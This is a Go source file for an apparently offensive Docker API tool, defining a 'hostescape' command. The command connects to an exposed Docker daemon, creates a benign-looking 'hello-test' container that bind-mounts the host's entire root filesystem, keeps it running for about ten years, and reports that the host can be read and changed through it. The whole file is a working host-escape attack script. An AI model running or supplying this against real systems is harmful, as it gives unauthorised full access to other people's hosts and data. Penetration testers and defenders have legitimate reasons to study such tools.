package cmd

import (
	"context"
	"docker-api/utils"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/spf13/cobra"
	"log"
	"strconv"
	"time"
)

var hostescapeCmd = &cobra.Command{
	Use:   "hostescape",
	Short: "Escape to HOST by creating an evil container",
	Run:   HostEscape,
}

func init() {
	hostescapeCmd.Flags().StringVar(&address, "address", "", "Target API opened IP and port: tcp://127.0.0.1:2375")
	hostescapeCmd.Flags().StringVar(&clientversion, "clientversion", "1.49", "The DockerAPI version configured for this Docker client program")
	hostescapeCmd.Flags().StringVar(&imagename, "imagename", "ubuntu:latest", "Image name (tag optional)")
	if err := hostescapeCmd.MarkFlagRequired("address"); err != nil {
		log.Fatal(err)
	}
	rootCmd.AddCommand(hostescapeCmd)
}

func HostEscape(cmd *cobra.Command, args []string) {
	dockerClient, err := utils.CreateDockerClient(address, clientversion, proxyaddr)
	if err != nil {
		log.Fatal(err)
	}
	defer dockerClient.Close()

	ctrName := "hello-test" + strconv.FormatInt(time.Now().Unix(), 10)
	ctrConfig := &container.Config{
		Image: imagename,
		Cmd:   []string{"/bin/sleep", "3650d"},

		Tty: true,
	}

	hostConfig := &container.HostConfig{
		Mounts: []mount.Mount{
			{
				Type:   mount.TypeBind,
				Source: "/",
				Target: "/test",
				// ReadOnly: true,
			},
		},
	}

	resp, err := dockerClient.ContainerCreate(context.Background(), ctrConfig, hostConfig, nil, nil, ctrName)
	if err != nil {
		log.Fatalf("Error creating container: %v", err)
	}
	createID := resp.ID

	if err := dockerClient.ContainerStart(context.Background(), createID, container.StartOptions{}); err != nil {
		log.Fatalf("Error starting container %s: %v", createID, err)
	}
	log.Printf("Created and started container: %s (%s)", ctrName, createID)

	log.Printf("❗Now you can access / OF HOST through /test OF %s created above", ctrName)
}
